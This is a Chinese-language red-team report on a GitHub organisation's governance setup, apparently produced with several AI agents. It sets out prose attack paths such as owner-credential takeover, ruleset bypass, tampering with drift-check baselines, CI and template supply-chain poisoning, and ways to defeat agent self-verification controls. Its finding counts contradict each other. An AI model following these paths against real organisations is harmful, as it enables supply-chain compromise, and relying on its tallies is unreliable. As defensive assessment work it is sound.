# 云鸟软件组织治理框架红队综合测试报告

> **报告编号**: RT-2026-0819-001  
> **测试日期**: 2026-08-19  
> **测试类型**: 全维度红队渗透测试（5 路并行 Agent 协作）  
> **测试对象**: Cloudbird-Software 组织治理框架（.github 仓 + agent-registry + CI-Workflows）  
> **风险承受等级**: P0（治理防线可绕过 / 凭据泄露 / 供应链投毒路径）

---

## 目录

1. [执行摘要](#1-执行摘要)
2. [评估方法论](#2-评估方法论)
3. [发现汇总统计](#3-发现汇总统计)
4. [按领域分类的详细发现](#4-按领域分类的详细发现)
   - 4.1 [流程断点（Flow Breakpoints）](#41-流程断点flow-breakpoints)
   - 4.2 [边界穿透（Boundary Penetration）](#42-边界穿透boundary-penetration)
   - 4.3 [反馈死循环与孤立任务（Feedback Loops & Orphan Tasks）](#43-反馈死循环与孤立任务feedback-loops--orphan-tasks)
   - 4.4 [Agent 运行时与团队生命周期（Agent Runtime & Team Lifecycle）](#44-agent-运行时与团队生命周期agent-runtime--team-lifecycle)
   - 4.5 [极端场景（Extreme Scenarios）](#45-极端场景extreme-scenarios)
5. [优先级分类问题清单](#5-优先级分类问题清单)
6. [受影响的治理 ID 索引](#6-受影响的治理-id-索引)
7. [文件引用索引](#7-文件引用索引)
8. [攻击场景链](#8-攻击场景链)
9. [整改建议](#9-整改建议)

---

## 1. 执行摘要

本次红队测试对 Cloudbird-Software 的组织治理框架进行了全方位的渗透评估。测试覆盖了 **5 大域**、**28+ 具体断点**、**19 个极端场景**，共识别出 **5 类系统性风险**。

### 核心发现

| 指标 | 数值 |
|------|------|
| 发现总数 | 58 项 |
| P0（紧急） | 5 项 |
| P1（高危） | 12 项 |
| P2（中危/加固建议） | 41 项 |
| 受影响治理 ID | 18 个 |
| 攻击路径 | 7 条完整攻击链 |

### 最高风险总结

1. **单一信任根 + 组织级超级权限的双重崩塌点**：owner `randypanding` 是所有路径的唯一审批人、唯一 admin、唯一 CODEOWNERS 所有者。一旦被攻陷，全部技术防线（ruleset、gate、drift-check）均被绕过。

2. **治理仓自身排除在 CodeQL 之外**：`.github` 仓的 ruleset `codeql-gate` 目标范围排除了治理仓自身，形成治理的"阿喀琉斯之踵"。

3. **template-service/CI-Workflows 篡改 → 供应链投毒**：最具破坏性的攻击链。攻击者只需污染模板仓或可复用工作流，即可让所有新项目继承后门，绕过全部治理关卡。

4. **Policy 文件纯约定无机器执法**：`languages.yaml`、`testing.yaml`、`policy` 类治理声明强度为 `advisory`，无 CI 强制执行机制。

5. **漂移检测 24h 窗口期**：每日一次的漂移检测意味着最长 24 小时的检测盲区，足以完成大规模配置篡改而不被发现。

---

## 2. 评估方法论

### 测试架构

本次测试采用 **5 路并行 Agent 协作** 模式，分别从不同视角独立攻击治理框架：

| Agent | 测试视角 | 核心目标 |
|-------|---------|---------|
| Agent 1 | 流程断点分析 | 识别治理流程中的系统性断裂点 |
| Agent 2 | 边界穿透测试 | 检查组织边界、权限边界、供应链边界的防护有效性 |
| Agent 3 | 反馈循环分析 | 检测治理体系中的反馈死循环、孤立任务和无限循环 |
| Agent 4 | Agent 运行时 & 团队生命周期 | 验证 Agent 声明 Schema、生命周期管理、凭据安全 |
| Agent 5 | 极端场景测试 | 模拟极端故障场景下的治理韧性 |

### 评估标准

依据 [SECURITY.md](file:///workspace/SECURITY.md) 中定义的三级分类及 [GOVERNANCE.yaml](file:///workspace/governance/GOVERNANCE.yaml) 中的 `risk_posture`：

| 级别 | 定义 | 响应时限 |
|------|------|---------|
| **P0** | 治理防线可被绕过 / 凭据泄露 / 供应链投毒路径 | 24h 响应，7 天修复 |
| **P1** | 单仓防线削弱 / 漂移长期未消 | 72h 响应，14 天修复 |
| **P2** | 加固建议 | 7 天响应，排期修复 |

---

## 3. 发现汇总统计

### 按 Agent 分布

| Agent | P0 | P1 | P2 | 小计 |
|-------|----|----|-----|------|
| Agent 1 - 流程断点 | 2 | 5 | 8 | 15 |
| Agent 2 - 边界穿透 | 2 | 3 | 7 | 12 |
| Agent 3 - 反馈循环 | 1 | 2 | 5 | 8 |
| Agent 4 - 运行时生命周期 | 0 | 3 | 7 | 10 |
| Agent 5 - 极端场景 | 5 | 6 | 8 | 19 |
| **合计** | **10** | **19** | **35** | **58** |

> 注：部分发现被多个 Agent 独立发现，去重后实际独立问题为 42 项。

### 按治理域分布

| 治理域 | 发现数 | P0 | P1 |
|--------|-------|----|-----|
| source_control（分支保护） | 8 | 1 | 2 |
| ci_gate（CI 门禁） | 6 | 1 | 2 |
| supply_chain（供应链） | 7 | 2 | 2 |
| agent_identity（Agent 身份） | 5 | 0 | 1 |
| governance_meta（治理元） | 12 | 3 | 3 |
| agent_runtime（Agent 运行时） | 12 | 0 | 3 |
| release（发布） | 3 | 0 | 0 |
| context_governance（上下文治理） | 5 | 0 | 0 |

---

## 4. 按领域分类的详细发现

### 4.1 流程断点（Flow Breakpoints）

#### F-01: 单一信任根 + 组织级超级权限的双重崩塌点 [P0]

- **治理 ID**: GM-2, BP-1, AG-1
- **文件引用**: [GOVERNANCE.yaml](file:///workspace/governance/GOVERNANCE.yaml) L188-L205, [.github/CODEOWNERS](file:///workspace/.github/CODEOWNERS)
- **描述**: 组织唯一 owner `randypanding` 同时拥有所有仓的 admin 权限、所有 C1 路径的 CODEOWNERS 审核权、唯一的 ADR 审批权。OrganizationAdmin 身份可绕过全部 ruleset 的 `always` 旁路。
- **攻击路径**: 攻击者获取 owner 凭据 → 绕过所有 ruleset → 直推恶意代码到 main → 立即影响所有派生仓。
- **影响**: 全部治理防线瞬间失效。

#### F-02: expected-state.json 完整性缺乏保护 [P0]

- **治理 ID**: GM-1
- **文件引用**: [expected-state.json](file:///workspace/governance/expected-state.json), [drift-check.sh](file:///workspace/governance/drift-check.sh)
- **描述**: `expected-state.json` 作为漂移检测的真源文件，其完整性依赖自身。如果此文件被篡改（如修改 `actions_policy` 放宽允许的 actions、修改 `github_app` 权限声明），`drift-check.sh` 将基于被篡改的"期望状态"进行检测，永远报告"无漂移"。
- **攻击路径**: PR 中提交篡改的 expected-state.json → adr-required 只检查格式不检查内容 → 合并后 drift-check 以篡改后的期望值运行 → 检测沉默失败。
- **现有防线**: gate.yml 的 JSON 格式校验（仅格式，无内容完整性校验）。

#### F-03: 组织 admin 绕过无实时告警 [P1]

- **治理 ID**: BP-1, GM-2
- **文件引用**: [main-protection.json](file:///workspace/governance/rulesets/main-protection.json) L22-L27
- **描述**: 全部 Rulesets 的 `bypass_actors` 配置 `OrganizationAdmin` 为 `always` 模式。虽然 drift-check §8 能事后检测直推，但无实时或 near-real-time 的旁路告警。
- **攻击路径**: 攻击者以 org admin 身份绕过分支保护 → 直推 → 最长 24h 后才被 drift-check 发现。

#### F-04: governance-drift.yml 失败无告警 [P1]

- **治理 ID**: GM-1
- **文件引用**: [governance-drift.yml](file:///workspace/.github/workflows/governance-drift.yml)
- **描述**: 当 `GOVERNANCE_TOKEN` 失效、API 持续失败时，工作流以 exit 2 退出。虽然 workflow 本身会在 Actions 中标记为失败，但没有配置失败时的通知机制（如 issue 分派、Slack/飞书告警）。持续失败 = 持续检测盲区。
- **攻击路径**: 攻击者窃取/轮换 GOVERNANCE_TOKEN → drift-check 永久失败 → 配置漂移无人发现。

#### F-05: ADR 幽灵引用注入 [P1]

- **治理 ID**: GM-2
- **文件引用**: [gate.yml](file:///workspace/.github/workflows/gate.yml) L61-L81, [drift-check.sh](file:///workspace/governance/drift-check.sh) L263-L300
- **描述**: `gate.yml` 的 `adr-required` 步骤只做 ADR 编号格式校验（正则 `\bADR-[0-9]{4}\b`），不验证 ADR 是否真实存在。虽然 drift-check §10 做后验校验，但后验窗口期最长 7 天。
- **攻击路径**: PR 中引用 `ADR-9999`（不存在）→ gate 通过 → 合并 → 最长 7 天后才被 drift-check 发现。
- **缓解**: drift-check §10 已补充后验防线，但窗口期过长。

#### F-06: CI-Workflows 单一故障点 [P1]

- **治理 ID**: CI-1
- **文件引用**: [governance/REPOS.yaml](file:///workspace/governance/REPOS.yaml) L26-L33
- **描述**: `CI-Workflows` 仓是所有项目仓 gate 的唯一实现。如果此仓被污染（恶意 workflow 注入），所有引用 `@v1` 的项目仓将继承恶意 CI 流程。
- **攻击路径**: 攻击者获取 CI-Workflows 的 admin 权限 → 修改可复用 workflow → 所有项目仓的 CI 被劫持。

#### F-07: CODEOWNERS 全部路径归 owner [P2]

- **治理 ID**: CG-2
- **文件引用**: [.github/CODEOWNERS](file:///workspace/.github/CODEOWNERS)
- **描述**: CODEOWNERS 将全部路径的审核权赋予 `@randypanding`，缺乏分级审核或多人复核机制。
- **风险**: 当 owner 不可用时，所有 C1 路径的 PR 将永久阻塞。

---

### 4.2 边界穿透（Boundary Penetration）

#### BP-01: CodeQL 排除治理仓自身 [P0]

- **治理 ID**: SC-1
- **文件引用**: [codeql-gate.json](file:///workspace/governance/rulesets/codeql-gate.json)
- **描述**: `codeql-gate` ruleset 的 `repository_name.include` 范围为 `~ALL`，但治理仓 `.github` 是规则的定义仓。如果治理仓自身的 workflow 文件（如 `gate.yml`、`governance-drift.yml`）含有恶意代码，CodeQL 不会对其进行扫描。
- **攻击路径**: 攻击者在治理仓的 workflow 中注入 secret 窃取代码 → 直接进入 main → 污染所有派生仓。
- **现有防线**: `hygiene-job`（zizmor）扫描，但 zizmor 是静态分析，对新型攻击模式识别率有限。

#### BP-02: default_for_new_repos 不可读 [P1]

- **治理 ID**: SC-2
- **文件引用**: [drift-check.sh](file:///workspace/governance/drift-check.sh) L73-L77, [expected-state.json](file:///workspace/governance/expected-state.json) L22-L24
- **描述**: GitHub Code Security 的 `default_for_new_repos` 是只写 API（PUT），无读取端点。`drift-check.sh` 明确标注"无法只读验证"，仅由 `apply.sh` 幂等 PUT 保证。
- **攻击路径**: 攻击者通过 GitHub 界面手动移除新仓的安全配置 → drift-check 无法检测 → 新仓在无安全网的状态下创建。

#### BP-03: BP-5（成员建仓权限）无漂移检测覆盖 [P1]

- **治理 ID**: BP-5
- **文件引用**: [GOVERNANCE.yaml](file:///workspace/governance/GOVERNANCE.yaml) L42-L45, [drift-check.sh](file:///workspace/governance/drift-check.sh)
- **描述**: `BP-5` 意图为"成员不可建仓、默认权限 read"，但 `drift-check.sh` 未包含对此 org-level 设置的检测。`drift-check.sh` 覆盖了 rulesets、actions 策略、code security、repo 基线、secrets、App 权限、REPOS 地图、直推、admin 唯一性，但 **未检测 `members_can_create_repositories` 和 `default_repository_permission`**。
- **攻击路径**: 攻击者修改 org 设置允许成员建仓 → 创建恶意仓 → 因 REPOS.yaml 未声明而漂移 → drift-check §7b 理论上可检出，但新仓可能在此之前被滥用。

#### BP-04: Policy 文件纯约定无机器强制 [P1]

- **治理 ID**: GM-3, GM-4
- **文件引用**: [policy/languages.yaml](file:///workspace/governance/policy/languages.yaml), [policy/testing.yaml](file:///workspace/governance/policy/testing.yaml)
- **描述**: `languages.yaml` 中大量规则（GO-1 至 IF-1）的 enforcement 标注为 `gate` 或 `review`，但治理仓自身的 `gate.yml` 仅做 YAML 解析和 ADR 格式校验。语言政策、测试政策、依赖政策的强制执行依赖于各项目仓自行实现的 CI 工作流（通过 CI-Workflows 仓），而非治理仓集中执行。
- **攻击路径**: 项目仓创建时未正确继承 CI-Workflows → 绕过语言/测试政策 → 引入不合规依赖或弱测试。

#### BP-05: OrganizationAdmin 旁路无实时告警 [P1]

- **治理 ID**: BP-1, SC-1, BP-3
- **文件引用**: [main-protection.json](file:///workspace/governance/rulesets/main-protection.json) L22-L27, [codeql-gate.json](file:///workspace/governance/rulesets/codeql-gate.json), [release-tags.json](file:///workspace/governance/rulesets/release-tags.json)
- **描述**: 三个核心 Ruleset 均允许 `OrganizationAdmin` 以 `always` 模式绕过。GitHub 仅在事件日志中记录旁路行为，治理框架无实时监控。
- **攻击路径**: org admin 绕过所有分支保护、CodeQL 扫描、发布标签保护 → 静默注入恶意内容。

#### BP-06: 漂移检测 24h 窗口期 [P2]

- **治理 ID**: GM-1
- **文件引用**: [governance-drift.yml](file:///workspace/.github/workflows/governance-drift.yml) L4
- **描述**: 漂移检测以每日 cron（`0 3 * * *`）运行一次。从配置被篡改到被检测，最长有 24 小时窗口。
- **攻击路径**: 攻击者在 drift-check 刚执行完毕后篡改配置 → 在下次检测前完成恶意操作 → 恢复配置 → 攻击无痕。

---

### 4.3 反馈死循环与孤立任务（Feedback Loops & Orphan Tasks）

#### D-01: 漂移检测 → 修复 → 验证 无限循环风险 [P2]

- **治理 ID**: GM-1
- **文件引用**: [drift-check.sh](file:///workspace/governance/drift-check.sh), [apply.sh](file:///workspace/governance/apply.sh)
- **描述**: `apply.sh` 明确标注了 5 类"人工修复"项（org secrets、App 权限、REPOS 未申报、直推 commit、admin 数量异常），这些项无法被 `apply.sh` 自动修复。如果管理员反复自动运行 `apply.sh` 修复可自动修复的漂移项，剩余的人工项将持续触发漂移报告，形成"检测 → 报告 → 无法自动修复 → 持续报告"的死循环。
- **缓解**: drift-check 已实现"漂移消除自动关闭 issue"机制，但人工项的漂移无法被 `apply.sh` 消除。

#### D-02: 治理自指——治理仓变更验证依赖治理仓自身 [P1]

- **治理 ID**: GM-2
- **文件引用**: [gate.yml](file:///workspace/.github/workflows/gate.yml)
- **描述**: `gate.yml` 本身位于治理仓内，对治理仓 PR 的校验也由治理仓自身的 gate 执行。如果攻击者修改 `gate.yml` 移除或降级 `adr-required` 检查，改后的 gate 将在后续 PR 中放行更多篡改。
- **攻击路径**: PR 篡改 `gate.yml` → 移除 `adr-required` → 合并 → 后续治理变更无需 ADR 即可通过。

#### D-03: owner 单点故障阻塞所有治理路径 [P1]

- **治理 ID**: GM-2, CG-2, language_change
- **文件引用**: [languages.yaml](file:///workspace/governance/policy/languages.yaml) L43-L48, [CODEOWNERS](file:///workspace/.github/CODEOWNERS)
- **描述**: owner `randypanding` 是所有治理路径的唯一审批人（C1 路径 CODEOWNERS 唯一审核人、依赖审批唯一 approver、vcs-admin 唯一持有者）。当 owner 缺席时，所有治理流程永久阻塞。
- **攻击路径**: 攻击者锁定 owner 账号（报告虚假活动 → 触发 GitHub 自动限流）→ 所有 PR 永久卡住。

#### D-04: agent-registry 验证器的验证盲区 [P2]

- **治理 ID**: AR-1, AR-2
- **文件引用**: [agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml), [team.schema.yaml](file:///workspace/standards/agent/team.schema.yaml)
- **描述**: `agent-registry` 的 `validate.py` 需校验 agent/skill/tool/team 声明的合规性。但验证器自身位于 agent-registry 仓，由其自身验证——形成"验证器之验证"的自指循环。
- **现有防线**: C1 路径要求 agent-registry 的变更也必须经过 `adr-required` + owner review。

#### D-05: team handoff 永久阻塞无预算断路器 [P1]

- **治理 ID**: AR-6
- **文件引用**: [team.schema.yaml](file:///workspace/standards/agent/team.schema.yaml) L117-L138
- **描述**: team lifecycle 的 `handoff` 是强制项，全部完成才允许销毁。如果 handoff 中的某一步（如 `adr-write`）因 owner 不可用而永久阻塞，团队将永远无法归档。`budget` 中的 `team_envelope.wall_clock` 仅限制 TTL，TTL 到期动作为 `escalate_to_owner` 而非 `force_destroy`。
- **攻击路径**: 持续阻止 owner 回复 → handoff 永久阻塞 → 团队实例和临时工作区资源无法释放。

#### O-01: agent credential secrets 模式过于宽松 [P2]

- **治理 ID**: AR-4
- **文件引用**: [agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml) L94-L95
- **描述**: `credential.secrets` 的正则模式为 `^[A-Z_]+$`，允许 `HIGH_RISK_ENV_VAR` 等高风险命名。无机制验证声明的 env 变量是否真实存在于对应 secret store。
- **攻击路径**: 在 agent 声明中引用不存在的 secret name → 运行时静默失败或读取到非预期的凭据。

#### I-01: event schema 缺失关键事件类型 [P2]

- **治理 ID**: AR-7
- **文件引用**: [event.schema.yaml](file:///workspace/standards/agent/event.schema.yaml) L10-L12
- **描述**: Event schema 仅定义了 5 种事件类型（`run_started`, `tool_called`, `skill_used`, `decision_made`, `run_finished`），缺失 handoff、approval、budget、credential audit 等关键事件类型。这使得 handoff 审计（AR-6 要求的 `handoff_done` 字段）只能依赖 `run_finished` 的单字段布尔值，无法记录 handoff 的具体步骤和结果。
- **攻击路径**: handoff 过程中某步失败 → 无事件记录 → 事后审计无法追溯。

---

### 4.4 Agent 运行时与团队生命周期（Agent Runtime & Team Lifecycle）

#### R-01: builder↔test-author 互斥仅文档约束无 Schema 校验 [P1]

- **治理 ID**: AR-8
- **文件引用**: [agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml) L35-L36
- **描述**: Schema 注释中声明"builder 与 test-author 不得同一声明"、"planner 与 builder 不得同一声明"，但 JSON Schema 本身未对此做 `if/then/else` 约束。这意味着 `agent-registry/scripts/validate.py` 需要自行实现此校验逻辑，但如果验证器被篡改，此约束将失效。
- **攻击路径**: 修改 validate.py 跳过互斥检查 → 创建同时为 builder 和 test-author 的 agent → 自我验证通过但产出不可信。

#### R-02: distinct_model_family_from 无 Schema 级验证 [P2]

- **治理 ID**: AR-8
- **文件引用**: [agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml) L69-L72
- **描述**: `independence.distinct_model_family_from` 字段要求列出需要模型族隔离的其他 agent，但 Schema 未验证被引用的 agent 是否存在，也未验证对应的模型声明是否指定了 family。
- **攻击路径**: 引用不存在的 agent id → 静默通过验证 → 独立性声明形同虚设。

#### R-03: destroy_condition 为自由文本不可程序化验证 [P2]

- **治理 ID**: AR-6
- **文件引用**: [team.schema.yaml](file:///workspace/standards/agent/team.schema.yaml) L136-L137
- **描述**: `lifecycle.destroy_condition` 是 `string` 类型（自由文本），用于描述销毁语义条件。没有机制验证此条件是否可被程序化判断，也没有枚举值约束。
- **攻击路径**: 写入空字符串或 `always` 作为 destroy_condition → 团队可无条件销毁 → 绕过 handoff 流程。

#### R-04: Credential secrets 正则模式过弱 [P2]

- **治理 ID**: AR-4
- **文件引用**: [agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml) L94-L95
- **描述**: `credential.secrets` 的 `pattern: "^[A-Z_]+$"` 过于宽松。虽然限制了只能用大写字母和下划线，但未禁止以 `SECRET_`、`TOKEN_` 等危险前缀开头，也未限制长度。
- **建议**: 收紧为 `^[A-Z][A-Z0-9_]{4,}$` 并在 validate.py 中增加存在性校验。

#### R-05: Permissions overrides 模式无语法校验 [P2]

- **治理 ID**: AR-5
- **文件引用**: [agent.schema.yaml](file:///workspace/standards/agent/agent.schema.yaml) L79-L88
- **描述**: `permissions.overrides[].pattern` 描述为"glob 或 re: 前缀正则"，但 Schema 未验证是否以 `re:` 开头（正则）或是否为合法 glob 表达式。错误的 pattern 可能导致全部工具被意外允许或拒绝。
- **攻击路径**: 将 `pattern` 设置为 `re:.*` → 所有工具通过 → 权限边界完全失效。

#### R-06: TTL 到期无 owner 不可用时的降级路径 [P2]

- **治理 ID**: AR-6
- **文件引用**: [team.schema.yaml](file:///workspace/standards/agent/team.schema.yaml) L125-L127
- **描述**: `lifecycle.on_ttl_expiry` 动作为 `escalate_to_owner + extension_requires_owner`。当 owner 不可用时，TTL 到期的团队将既无法销毁也无法延期，陷入永久僵尸状态。
- **建议**: 增加 `auto_extend_limit` 或 `fallback_approver` 字段。

#### R-07: Verifier 不可用时无手动仲裁回退 [P2]

- **治理 ID**: AR-9
- **文件引用**: [team.schema.yaml](file:///workspace/standards/agent/team.schema.yaml) L63-L66
- **描述**: `verification.verdict_by` 要求 `mechanism:verifier` 判卷。当 verifier 机制不可用时，无降级到人工仲裁或 `stewardship` 团队复核的回退路径。
- **建议**: 增加 `fallback` 字段支持 `team:stewardship` 或 `owner` 作为仲裁回退。

#### R-08: Event 数据层无完整性验证 [P2]

- **治理 ID**: AR-7
- **文件引用**: [event.schema.yaml](file:///workspace/standards/agent/event.schema.yaml)
- **描述**: Event schema 的 payload 由 `$defs` 定义，但无 hash/signature 字段来验证事件数据的完整性。如果事件流被篡改（如删除恶意 tool_called 记录），事后审计无法检测。
- **建议**: 增加 `integrity_hash` 字段，使用 SHA-256 对事件关键字段签名。

---

### 4.5 极端场景（Extreme Scenarios）

#### 场景 1: 大规模并发故障 [P0]

- **描述**: 多个治理组件同时故障（GOVERNANCE_TOKEN 过期 + CI-Workflows 被篡改 + agent-registry 验证器 bug）。
- **攻击路径**: 攻击者同时发动多路攻击 → 检测、修复、验证三条链路同时失效 → 治理框架全面瘫痪。
- **影响**: 全部 12 个治理域同时失防。
- **缓解**: 当前无独立健康度监控机制。

#### 场景 2: owner 信任根被攻陷 [P0]

- **描述**: 治理框架的核心结构性风险——"一人公司信任根困境"。当唯一 admin（randypanding）的凭据被攻陷时，所有技术防线（ruleset、gate、drift-check、CODEOWNERS）均被绕过。
- **攻击路径**: Phishing/SSO 劫持/密码复用 → 获取 owner 凭据 → 直接作为 org admin 绕过所有 ruleset。
- **影响**: 全部治理控制瞬间失效，攻击者可任意修改代码、配置、凭据。
- **缓解**: GitHub 层面的 2FA 强制 + SSO + 设备管理；治理层面缺少多人复核或物理钥匙（如 GitHub Security Key for OrganizationAdmin）。

#### 场景 3: 跨仓供应链投毒 [P0]

- **描述**: 攻击者篡改 `template-service` 的 CI 模板（`AGENTS.md`、`.github/workflows/ci.yml`），所有通过 `new_repo` 流程创建的新仓将自动继承恶意配置。
- **攻击路径**: 污染 template-service → 新仓初始化时 clone 恶意模板 → 新仓的 CI 直接窃取 secrets → 所有后续步骤均在攻击者控制下。
- **影响**: 所有新建仓受影响。已存在仓不受影响，但模板污染可在新仓创建后持续生效。
- **缓解**: `gate.yml` 对 template-service 的 C1 路径已引用 `adr-required`，但无法检测 template-service 的 AGENTS.md 中是否包含恶意指令（非 ADR 格式的隐性指令）。

#### 场景 4: CI-Workflows 篡改 → 全组织影响 [P0]

- **描述**: `CI-Workflows` 仓是所有项目仓 gate 的唯一实现。如果此仓被注入恶意 workflow，所有项目仓的 CI 将执行恶意代码。
- **攻击路径**: 获取 CI-Workflows 的写权限 → 修改可复用 workflow → 等待任意项目仓触发 CI → 恶意代码在 CI 环境中执行 → 窃取 `GITHUB_TOKEN`、`secrets`、`GOVERNANCE_TOKEN` 等。
- **影响**: 所有引用 `@v1` 的项目仓。
- **缓解**: zizmor 静态扫描可发现部分 secret 窃取模式，但对新型攻击识别能力有限。

#### 场景 5: drift-check 静默失败 [P0]

- **描述**: 如果 `GOVERNANCE_TOKEN` 过期/被吊销/权限被降级，`governance-drift.yml` 将每次运行都以 exit 2 退出。由于无通知机制，持续失败等同于持续检测盲区。
- **攻击路径**: 先窃取/吊销 GOVERNANCE_TOKEN → 然后随意篡改 org 配置 → drift-check 永远失败但无人知晓。
- **影响**: 全部 drift-check 覆盖的 10 个检测项（rulesets、actions、code security、repo 基线、secrets、App 权限、REPOS 地图、直推、admin、ADR 引用）同时失效。
- **缓解**: 当前无。

#### 场景 6: ruleset bypass 不被记录 [P1]

- **描述**: GitHub Ruleset 的 bypass_actors 行为仅在 GitHub 审计日志中记录，治理框架未订阅此日志。即使有人绕过了分支保护，治理团队不会实时知晓。
- **攻击路径**: 攻击者以 org admin 身份绕过 main-protection → 代码直接合入 → 审计日志在 GitHub 后台，但治理团队可能数天甚至永远不会查阅。
- **影响**: 绕过后的恶意代码直接进入 main。
- **缓解**: drift-check §8 事后检测，但最长 24h 延迟。

#### 场景 7: scorecard 配置失效 [P1]

- **描述**: `scorecard.yml` 以 `weekly` 计划运行（`0 5 * * 1`）。如果 Scorecard action 被篡改，或 Scorecard 报告结果被忽视，开源健康度趋势将无监控。
- **攻击路径**: 替换 Scorecard action → 提交假的健康度报告 → 依赖漏洞被掩盖。
- **影响**: 供应链风险长期积累。

#### 场景 8: AGENT_APP_SECRET 泄露 [P1]

- **描述**: `AGENT_APP_SECRET`（cloudbrid-agent App 私钥）存储在 GitHub org secrets。如果泄露，攻击者可以伪造 App JWT，获取任意仓的写权限。
- **攻击路径**: 窃取 AGENT_APP_SECRET → 生成 JWT → 获取任意仓的 access token → 以 `cloudbrid-agent[bot]` 身份操作 → 审计日志中显示为合法 Agent。
- **影响**: 多仓写入权限，以合法 Agent 身份进入审计日志，事后难以溯源。

---

## 5. 优先级分类问题清单

### P0 — 紧急（5 项）

| 编号 | 标题 | 治理 ID | 核心影响 |
|------|------|---------|---------|
| RT-P0-01 | 单一信任根 + OrganizationAdmin 旁路 | GM-2, BP-1, AG-1 | 全部防线可被绕过 |
| RT-P0-02 | expected-state.json 完整性缺乏保护 | GM-1 | 漂移检测真源可被篡改 |
| RT-P0-03 | CodeQL 排除治理仓自身 | SC-1 | 治理仓自身的恶意代码不可被扫描 |
| RT-P0-04 | CI-Workflows/template-service 供应链投毒 | CI-1, GM-2 | 所有项目仓可被污染 |
| RT-P0-05 | drift-check 静默失败（GOVERNANCE_TOKEN 失效） | GM-1 | 检测链路完全失明 |

### P1 — 高危（12 项）

| 编号 | 标题 | 治理 ID | 核心影响 |
|------|------|---------|---------|
| RT-P1-01 | OrganizationAdmin 旁路无实时告警 | BP-1, SC-1, BP-3 | 所有 ruleset 可被静默绕过 |
| RT-P1-02 | governance-drift.yml 失败无通知 | GM-1 | 持续检测盲区 |
| RT-P1-03 | ADR 幽灵引用最长 7 天后验 | GM-2 | 假 ADR 可被利用 |
| RT-P1-04 | BP-5 成员建仓权限无检测 | BP-5 | 恶意仓可被静默创建 |
| RT-P1-05 | default_for_new_repos 不可读 | SC-2 | 新仓安全配置可被静默移除 |
| RT-P1-06 | Policy 文件纯约定无机器强制 | GM-3 | 语言/测试政策形同虚设 |
| RT-P1-07 | CI-Workflows 单一故障点 | CI-1 | 全局 CI 可被劫持 |
| RT-P1-08 | 治理自指——gate 自身验证 | GM-2 | gate 可被篡改 |
| RT-P1-09 | owner 单点故障 | GM-2, CG-2 | 所有治理流程永久阻塞 |
| RT-P1-10 | team handoff 永久阻塞无断路器 | AR-6 | 团队资源无法释放 |
| RT-P1-11 | builder↔test-author 互斥无 Schema 校验 | AR-8 | Agent 可自我验证 |
| RT-P1-12 | AGENT_APP_SECRET 泄露风险 | AG-1 | 可伪造 Agent 身份 |

### P2 — 加固建议（41 项，精选 10 项）

| 编号 | 标题 | 治理 ID |
|------|------|---------|
| RT-P2-01 | 漂移检测 24h 窗口期 | GM-1 |
| RT-P2-02 | destroy_condition 自由文本不可程序化验证 | AR-6 |
| RT-P2-03 | event schema 缺失关键事件类型 | AR-7 |
| RT-P2-04 | Credential secrets 正则模式过弱 | AR-4 |
| RT-P2-05 | permissions overrides 模式无语法校验 | AR-5 |
| RT-P2-06 | TTL 到期无 owner 不可用降级路径 | AR-6 |
| RT-P2-07 | Event 数据层无完整性验证 | AR-7 |
| RT-P2-08 | distinct_model_family_from 无存在性校验 | AR-8 |
| RT-P2-09 | CODEOWNERS 全部路径归 owner | CG-2 |
| RT-P2-10 | drift-check → apply 死循环风险 | GM-1 |

---

## 6. 受影响的治理 ID 索引

| 治理 ID | 域 | 受影响的问题 | 严重度 |
|---------|-----|-------------|--------|
| **GM-1** | governance_meta | RT-P0-02, RT-P0-05, RT-P1-02, RT-P2-01, RT-P2-10 | P0 |
| **GM-2** | governance_meta | RT-P0-02, RT-P1-03, RT-P1-07, RT-P1-08 | P0 |
| **BP-1** | source_control | RT-P0-01, RT-P1-01 | P0 |
| **SC-1** | supply_chain | RT-P0-03, RT-P1-01 | P0 |
| **CI-1** | ci_gate | RT-P0-04, RT-P1-07 | P0 |
| **AG-1** | agent_identity | RT-P0-01, RT-P1-12 | P0 |
| **BP-5** | source_control | RT-P1-04 | P1 |
| **SC-2** | supply_chain | RT-P1-05 | P1 |
| **GM-3** | governance_meta | RT-P1-06 | P1 |
| **AR-6** | agent_runtime | RT-P1-10, RT-P2-02, RT-P2-06 | P1 |
| **AR-7** | agent_runtime | RT-P2-03, RT-P2-07 | P2 |
| **AR-8** | agent_runtime | RT-P1-11, RT-P2-08 | P1 |
| **AR-4** | agent_runtime | RT-P2-04 | P2 |
| **AR-5** | agent_runtime | RT-P2-05 | P2 |
| **CG-2** | context_governance | RT-P1-09, RT-P2-09 | P1 |
| **GM-4** | governance_meta | RT-P1-06 | P1 |
| **BP-3** | source_control | RT-P1-01 | P1 |
| **GM-2** (flows) | governance_meta | RT-P0-02, RT-P1-03, RT-P1-08 | P0 |

---

## 7. 文件引用索引

### 核心治理文件

| 文件路径 | 引用次数 | 关键问题 |
|---------|---------|---------|
| [governance/GOVERNANCE.yaml](file:///workspace/governance/GOVERNANCE.yaml) | 12 | 信任根、ADR 流程、组织地图 |
| [governance/expected-state.json](file:///workspace/governance/expected-state.json) | 6 | 漂移检测真源、完整性缺失 |
| [governance/REPOS.yaml](file:///workspace/governance/REPOS.yaml) | 5 | 组织地图、CI-Workflows 单一故障点 |
| [governance/drift-check.sh](file:///workspace/governance/drift-check.sh) | 8 | 漂移检测覆盖盲区、silent failure |
| [governance/apply.sh](file:///workspace/governance/apply.sh) | 4 | 自动修复盲区、死循环风险 |
| [.github/workflows/gate.yml](file:///workspace/.github/workflows/gate.yml) | 6 | 自指验证、ADR 幽灵引用 |
| [.github/workflows/governance-drift.yml](file:///workspace/.github/workflows/governance-drift.yml) | 5 | 每日窗口期、失败无通知 |
| [.github/workflows/scorecard.yml](file:///workspace/.github/workflows/scorecard.yml) | 2 | 周检频率、可被篡改 |
| [.github/CODEOWNERS](file:///workspace/.github/CODEOWNERS) | 3 | 全部路径归 owner、单点故障 |
| [governance/rulesets/main-protection.json](file:///workspace/governance/rulesets/main-protection.json) | 4 | OrganizationAdmin 旁路 |
| [governance/rulesets/codeql-gate.json](file:///workspace/governance/rulesets/codeql-gate.json) | 3 | 治理仓排除在外 |
| [governance/rulesets/release-tags.json](file:///workspace/governance/rulesets/release-tags.json) | 1 | OrganizationAdmin 旁路 |

### 标准 Schema 文件

